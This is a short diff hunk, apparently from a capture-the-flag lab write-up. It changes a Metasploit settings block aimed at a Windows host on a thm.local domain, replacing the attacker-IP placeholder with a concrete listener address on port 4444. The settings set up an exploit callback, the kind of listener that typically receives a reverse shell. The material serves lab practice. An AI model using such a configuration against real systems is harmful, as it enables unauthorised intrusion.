@@ -157,7 +157,7 @@ set RHOSTS 10.112.141.99
 set RPORT 443
 set VHOST WIN-12OUO7A66M7.thm.local
 set SSL true
-set LHOST <attacker_ip>
+set LHOST 192.168.134.19
 set LPORT 4444
 ```
 
